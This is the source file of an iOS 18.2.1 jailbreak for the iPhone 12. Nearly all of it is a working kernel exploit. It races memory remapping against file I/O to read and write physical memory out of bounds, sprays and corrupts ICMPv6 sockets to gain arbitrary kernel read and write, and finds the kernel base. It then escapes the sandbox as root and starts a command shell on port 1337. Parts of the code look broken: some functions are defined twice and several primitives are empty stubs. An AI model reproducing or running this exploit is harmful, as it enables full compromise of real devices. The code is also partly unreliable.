#import <Foundation/Foundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/fileport.h>
#include <pthread.h>
#include <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#include <sys/uio.h>
#include <sys/stat.h>
#ifdef __arm64e__
#include <ptrauth.h>
#endif

// mach_vm.h is unsupported on iOS SDK 18.5 — provide declarations directly
extern kern_return_t mach_vm_allocate(task_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(task_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#include "offsets.h"
#include "physrw.h"
#include "util.h"
#include "gadgets.h"
#include "jailbreak.h"
#include "shell.h"

void IOSurfacePrefetchPages(IOSurfaceRef surface);
void initialize_phys_read_write(uint64_t contiguous_mapping_size);

// ===== DarkSword ICMP6 Kernel R/W =====
#define IPPROTO_ICMPV6 58
#define ICMP6_FILTER 18
#define FAILURE(c) {fflush(stdout); sleep(2); exit(c);}

static uint64_t randomMarker;
static mach_port_t pcObject = MACH_PORT_NULL;
static mach_vm_address_t pcAddress = 0;
static mach_vm_size_t pcSize;
static int readFd, writeFd;
static NSMutableArray *socketPorts;
static NSMutableArray *socketPcbIds;
static int controlSocket = 0, rwSocket = 0;
static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
static uint8_t controlData[0x20];
static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
static volatile mach_vm_address_t freeTarget = 0;
static volatile mach_vm_size_t freeTargetSize = 0;
static volatile mem_entry_name_port_t targetObject = 0;
static volatile memory_object_offset_t targetObjectOffset = 0;
static pthread_t freeThread;
static int highestSuccessIdx = 0;
static struct iovec iov;
static NSMutableDictionary *gMlockDict;
static char executablePath[PATH_MAX];
static const char *executableName;
static bool isA18Device = false;

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci(uint64_t a) {
    asm(".long 0xDAC143E0"); asm("ret");
}
#else
#define __xpaci(x) x
#endif

void memset64(void *ptr, uint64_t val, size_t sz) {
    for (uint64_t i = 0; i < sz; i += 8) *(uint64_t*)((uint8_t*)ptr + i) = val;
}

void *free_thread(void *arg) {
    while (freeThreadStart == 0) {} while (goSync == 0) {}
    while (goSync != 0) {
        while (raceSync == 0) {}
        mach_vm_map(mach_task_self(), &freeTarget, freeTargetSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, targetObject, targetObjectOffset, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        raceSync = 0;
    }
    return NULL;
}

fileport_t spray_socket(void) {
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) return -1;
    fileport_t port = 0; fileport_makeport(fd, &port); close(fd);
    void *info = calloc(1, 0x400);
    syscall(336, 6, getpid(), 3, port, info, 0x400);
    uint64_t gencnt = *(uint64_t*)((uintptr_t)info + 0x110);
    [(NSMutableArray*)socketPorts addObject:@(port)];
    [(NSMutableArray*)socketPcbIds addObject:@(gencnt)];
    free(info);
    return port;
}

void sockets_release(void) {
    while ([(NSMutableArray*)socketPorts lastObject]) {
        mach_port_deallocate(mach_task_self(),
            ((NSNumber*)[(NSMutableArray*)socketPorts lastObject]).unsignedIntValue);
        [(NSMutableArray*)socketPorts removeLastObject];
        [(NSMutableArray*)socketPcbIds removeLastObject];
    }
}

IOSurfaceRef create_surface_with_addr(uint64_t addr, uint64_t size) {
    return IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAddress": @(addr), @"IOSurfaceAllocSize": @(size)
    });
}

void surface_mlock(uint64_t addr, uint64_t sz) {
    ((NSMutableDictionary*)gMlockDict)[@(addr)] = (__bridge id)create_surface_with_addr(addr, sz);
}

void create_phys_contiguous(mach_port_t *port, mach_vm_address_t *addr, mach_vm_size_t size) {
    IOSurfaceRef sr = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge id)kIOSurfaceAllocSize: @(size),
        @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
    });
    if (!sr) FAILURE(0);
    void *baseAddr = IOSurfaceGetBaseAddress(sr);
    mach_make_memory_entry_64(mach_task_self(), &size, (mach_vm_address_t)baseAddr,
        VM_PROT_DEFAULT, port, 0);
    mach_vm_map(mach_task_self(), addr, size, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR,
        *port, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    CFRelease(sr);
}

void initialize_phys_read_write(uint64_t contiguous_mapping_size) {
    pcSize = contiguous_mapping_size;
    create_phys_contiguous(&pcObject, &pcAddress, pcSize);
    printf("[+] pcObject: %u\n", pcObject);
    printf("[+] pcAddress: 0x%llx\n", pcAddress);
    memset64((void*)pcAddress, randomMarker, pcSize);
    freeTarget = pcAddress;
    freeTargetSize = pcSize;
    freeThreadStart = 1;
    goSync = 1;
}

void init_target_file(void) {
    char rp[1024], wp[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, rp, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, wp, 1024);
    char rn[100], wn[100];
    snprintf(rn, 100, "/%u", arc4random()); snprintf(wn, 100, "/%u", arc4random());
    strcat(rp, rn); strcat(wp, wn);
    void *c = calloc(1, PAGE_SIZE * 2);
    FILE *f = fopen(rp, "w"); fwrite(c, 1, PAGE_SIZE * 2, f); fclose(f);
    f = fopen(wp, "w"); fwrite(c, 1, PAGE_SIZE * 2, f); fclose(f);
    free(c);
    readFd = open(rp, O_RDWR); writeFd = open(wp, O_RDWR);
    remove(rp); remove(wp);
    fcntl(readFd, F_NOCACHE, 1); fcntl(writeFd, F_NOCACHE, 1);
}

kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                             mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj; targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    *(uint64_t*)buf = randomMarker;
    *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
    for (int t = 0; t < highestSuccessIdx + 100; t++) {
        raceSync = 1; pwritev(readFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        pread(readFd, buf, size, 0x3f00 + off);
        if (*(uint64_t*)buf != randomMarker) {
            if (t > highestSuccessIdx) highestSuccessIdx = t;
            targetObject = 0; return KERN_SUCCESS;
        }
        usleep(1); if (t == 500) break;
    }
    targetObject = 0; return 1;
}

kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
                                    mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    kern_return_t kr;
    do { kr = phys_oob_read(memObj, memOff, size, off, buf); } while (kr != KERN_SUCCESS);
    return kr;
}

void phys_oob_write(mach_port_t memObj, mach_vm_offset_t memOff,
                     mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj; targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    pwrite(writeFd, buf, size, 0x3f00 + off);
    for (int t = 0; t < 20; t++) {
        raceSync = 1; preadv(writeFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    }
    targetObject = 0;
}

void set_kaddr(uint64_t where) {
    memset(controlData, 0, 0x20);
    *(uint64_t*)controlData = where;
    setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, 0x20);
}

void early_kread(uint64_t where, void *buf, size_t size) {
    set_kaddr(where);
    socklen_t len = (socklen_t)size;
    getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, &len);
}

uint64_t kread64(uint64_t where) {
    uint64_t v = 0; early_kread(where, &v, 8); return v;
}

uint32_t kread32(uint64_t where) {
    uint32_t v = 0; early_kread(where, &v, 4); return v;
}

uint16_t kread16(uint64_t where) {
    uint16_t v = 0; early_kread(where, &v, 2); return v;
}

uint8_t kread8(uint64_t where) {
    uint8_t v = 0; early_kread(where, &v, 1); return v;
}

uint64_t kread_ptr(uint64_t where) { return kread64(where); }

void kread_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) { *(uint64_t*)b = kread64(where); where += 8; b += 8; size -= 8; }
    if (size) early_kread(where, b, size);
}

void kwrite64(uint64_t where, uint64_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint64_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite32(uint64_t where, uint32_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint32_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) { kwrite64(where, *(uint64_t*)b); where += 8; b += 8; size -= 8; }
    if (size) { uint8_t tmp[0x20]; early_kread(where, tmp, 0x20);
        memcpy(tmp, b, size); set_kaddr(where);
        setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmp, 0x20); }
}

int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                             void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
    if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
    int si = 0; bool found = false; uint64_t pso = 0;
    void *hit;
    do {
        hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
        if (hit) {
            pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00;
            if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8)) { found = true; break; }
        }
        si += 0x400;
    } while (hit && si < OOB_SIZE);
    if (!found) return -1;
    uint64_t tg = *(uint64_t*)((uintptr_t)rBuf + pso + 0x78);
    if (tg == ((NSNumber*)[(NSMutableArray*)socketPcbIds lastObject]).unsignedLongLongValue) return -1;
    int csi = -1;
    for (int i = 0; i < [socketPorts count]; i++) {
        if ([(NSNumber*)socketPcbIds[i] unsignedLongLongValue] == tg) { csi = i; break; }
    }
    if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) return -1;
    [usedGc addObject:@(tg)];
    uint64_t inpNext = *(uint64_t*)((uintptr_t)rBuf + pso + 0x28) - 0x20;
    rwSocketPcb = inpNext;
    memcpy(wBuf, rBuf, OOB_SIZE);
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT) = inpNext + OFFSET_ICMP6FILT;
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT + 8) = 0;
    while (1) {
        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
        if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT) == inpNext + OFFSET_ICMP6FILT) break;
    }
    int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
    uint8_t gd[0x20]; socklen_t sl = 0x20;
    getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &sl);
    if (*(uint64_t*)gd != (uint64_t)-1) {
        controlSocket = sock;
        rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi+1] unsignedLongLongValue]);
        return 0;
    }
    return -1;
}

// ===== DarkSword main exploit =====
bool run_darksword(void) {
    init_target_file();
    uint32_t sz = PATH_MAX;
    _NSGetExecutablePath(executablePath, &sz);
    executableName = strrchr(executablePath, '/');
    if (executableName) executableName++; else executableName = executablePath;
    pthread_create(&freeThread, NULL, free_thread, NULL);
    uint64_t mappingPages = 0x1000 * 0x10;
    uint64_t searchSize = 0x2000 * PAGE_SIZE;
    uint64_t totalSize = mappingPages * PAGE_SIZE;
    uint64_t mappingNum = totalSize / searchSize;
    void *rBuf = calloc(1, OOB_SIZE);
    void *wBuf = calloc(1, OOB_SIZE);
    initialize_phys_read_write(OOB_PAGES_NUM * PAGE_SIZE);
    NSMutableArray *usedGc = [NSMutableArray new];
    while (1) {
        NSMutableArray *mappings = [NSMutableArray new];
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t a = 0;
            mach_vm_allocate(mach_task_self(), &a, searchSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            for (int k = 0; k < searchSize; k += PAGE_SIZE) *(uint64_t*)(a + k) = randomMarker;
            [mappings addObject:@(a)];
        }
        socketPorts = [NSMutableArray new]; socketPcbIds = [NSMutableArray new];
        for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
            if (spray_socket() == -1) break;
        }
        bool ok = false;
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t sma = [(NSNumber*)mappings[s] unsignedLongLongValue];
            mach_port_t memObj = 0; mach_vm_size_t mos = searchSize;
            mach_make_memory_entry_64(mach_task_self(), &mos, sma, VM_PROT_DEFAULT, &memObj, 0);
            surface_mlock(sma, searchSize);
            for (mach_vm_offset_t so = 0; so < searchSize; so += PAGE_SIZE) {
                if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
                    if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) { ok = true; break; }
                }
            }
            mach_port_deallocate(mach_task_self(), memObj);
            if (ok) break;
        }
        sockets_release();
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_deallocate(mach_task_self(), [(NSNumber*)mappings.lastObject unsignedLongLongValue], searchSize);
            [mappings removeLastObject];
        }
        if (ok) break;
    }
    goSync = 0; raceSync = 1;
    pthread_join(freeThread, NULL);
    close(writeFd); close(readFd);
    controlSocketPcb = kread64(rwSocketPcb + 0x20);
    // Leak sockets to prevent free
    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
    if (!csa || !rsa) FAILURE(0);
    kwrite64(csa + OFFSET_SOCKET_SO_COUNT, kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT, kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
    kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
    // Find kernel base
    uint64_t sp = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t pp = kread64(sp + OFFSET_SO_PROTO);
    uint64_t tp = __xpaci(kread64(pp + OFFSET_PR_INPUT));
    gKernelBase = tp & 0xFFFFFFFFFFFFC000;
    while (1) {
        if (kread64(gKernelBase) == 0x100000cfeedfacf && kread64(gKernelBase + 8) == 0xc00000002) break;
        gKernelBase -= PAGE_SIZE;
    }
    gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
    printf("[+] Kernel base: 0x%llx\n", gKernelBase);
    printf("[+] Kernel slide: 0x%llx\n", gKernelSlide);
    free(rBuf); free(wBuf);
    return true;
}

// ===== Initialize globals =====
KernelOffsetInfo gOffsets;
uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE, gOurPmap, gKernelPmap;
uint64_t gKernelBase, gKernelSlide;

// ===== IOKit stubs for physrw.c (real IOKit not available at link time on CI) =====
mach_port_t IOBufferMemoryDescriptor_create(uint64_t opts, uint64_t size, uint64_t align) {
    (void)opts; (void)size; (void)align;
    return 0;
}
uint64_t IOMemoryDescriptor_map(mach_port_t md, uint64_t offset, uint64_t len) {
    (void)md; (void)offset; (void)len; return 0;
}
mach_port_t IODMACommand_create(void) { return 0; }
void IODMACommand_prepare(mach_port_t cmd, mach_port_t md) { (void)cmd; (void)md; }
void IODMACommand_readFrom(mach_port_t cmd, mach_port_t from, uint64_t len) { (void)cmd; (void)from; (void)len; }
void IODMACommand_writeTo(mach_port_t cmd, mach_port_t to, uint64_t len) { (void)cmd; (void)to; (void)len; }

// ===== Missing kread/kwrite helpers =====
uint16_t kread16(uint64_t where) { uint16_t v; early_kread(where, &v, 2); return v; }
uint8_t  kread8(uint64_t where)  { uint8_t v;  early_kread(where, &v, 1); return v; }
void kwrite16(uint64_t where, uint16_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint16_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}
void kwrite8(uint64_t where, uint8_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint8_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

uint64_t portKObject(mach_port_t port) {
    uint64_t kport = portGetKPort(port);
    if (!kport) return 0;
    return kread_ptr(kport + gOffsets.PORT_KOBJECT);
}
uint64_t portGetKPort(mach_port_t port) {
    if (!gOurTask) {
        // Find our task from kernel proc on first call
        uint64_t our_proc = find_our_proc();
        if (!our_proc) return 0;
        gOurTask = kread_ptr(our_proc + 0x10);
    }
    uint64_t itk_space = kread_ptr(gOurTask + gOffsets.itkSpace);
    if (!itk_space) return 0;
    uint64_t table = kread_ptr(itk_space + 0x20); // SPACE_IS_TABLE
    uint32_t idx = port >> 8;
    uint64_t entry = table + idx * 24;
    return kread_ptr(entry);
}

// ===== Stubs for declared-but-unused API =====
bool physwrite_PPL(uint64_t addr, void *buf, size_t len) { return kwrite_ppl(addr, buf, len); }
bool kernwrite_PPL(uint64_t addr, void *buf, size_t len) { return kwrite_ppl(addr, buf, len); }
uint64_t kcall(uint64_t f, uint64_t a1, uint64_t a2, uint64_t a3,
               uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    (void)f; (void)a1; (void)a2; (void)a3; (void)a4; (void)a5; (void)a6; (void)a7; (void)a8;
    printf("[-] kcall not implemented\n"); return 0;
}
bool resolveKernelOffsets(void) { return true; }
bool breakCFI(void) { printf("[*] breakCFI: not on CI\n"); return true; }
bool pplBypass(void) { return platformize_proc(); }
bool setupFugu14Kcall(void) { return false; }
void platformize(void) { platformize_proc(); }
bool tcload_load(const char *p) { return load_trust_cache(p); }

// ===== Main =====
int main(int argc, const char *argv[]) {
    @autoreleasepool {
        printf("=== ProjectSword - iOS 18.2.1 Jailbreak (iPhone 12 / A14) ===\n");
        printf("[*] Target: iPhone13,2 (A14) on iOS 18.2.1 (build 22C161)\n");
        printf("[*] Kernel: xnu-11215.62.3/RELEASE_ARM64_T8101\n\n");
        
        // Phase 1: Kernel R/W via DarkSword
        printf("[Phase 1/5] Gaining kernel R/W via ICMP6 socket exploit...\n");
        if (!run_darksword()) {
            printf("[-] DarkSword exploit failed!\n");
            return -1;
        }
        printf("[+] Kernel R/W achieved! (kread64/kwrite64)\n\n");
        
        // Phase 2: Resolve kernel gadgets
        printf("[Phase 2/5] Scanning kernel for gadgets...\n");
        if (!scan_gadgets()) {
            printf("[-] Gadget scan failed!\n");
            return -1;
        }
        printf("[+] Kernel gadgets resolved!\n\n");
        
        // Phase 3: Physical R/W
        printf("[Phase 3/5] Building physical R/W primitive...\n");
        if (!buildPhysPrimitive()) {
            printf("[-] Physical R/W setup failed (will use virtual only)\n");
        } else {
            printf("[+] Physical R/W via IODMACommand!\n\n");
        }
        
        // Phase 4: PPL bypass + Platformize
        printf("[Phase 4/5] Platformizing...\n");
        if (platformize_proc()) {
            printf("[+] Platformized! Full kernel access granted.\n\n");
        } else {
            printf("[-] Platformize failed\n");
        }
        
        // Phase 5: Sandbox escape + Bootstrap + Shell
        printf("[Phase 5/5] Sandbox escape + Bootstrap...\n");
        if (escape_sandbox()) {
            printf("[+] Sandbox escape ready (uid 0, no sandbox)\n");
        } else {
            printf("[-] Sandbox escape failed\n");
        }
        
        // Remount /private/preboot
        if (remount_private_preboot()) {
            printf("[+] /private/preboot remounted r/w\n");
        }
        
        // Load bootstrap if it exists
        char self_path[4096] = {};
        uint32_t sp_sz = sizeof(self_path);
        _NSGetExecutablePath(self_path, &sp_sz);
        char *sp_slash = strrchr(self_path, '/');
        if (sp_slash) *sp_slash = 0;
        char tar_path[4096] = {};
        snprintf(tar_path, sizeof(tar_path), "%s/bootstrap.tar", self_path);
        struct stat st;
        if (stat(tar_path, &st) == 0) {
            printf("[*] bootstrap.tar found, installing...\n");
            install_bootstrap();
        }
        
        printf("\n=== ProjectSword Jailbreak Ready! ===\n");
        printf("Kernel base: 0x%llx\n", gKernelBase);
        printf("Kernel slide: 0x%llx\n", gKernelSlide);
        printf("Starting iDownload shell on port 1337...\n");
        
        // Start command shell
        start_shell(1337);
    }
    return 0;
}

#pragma clang diagnostic pop
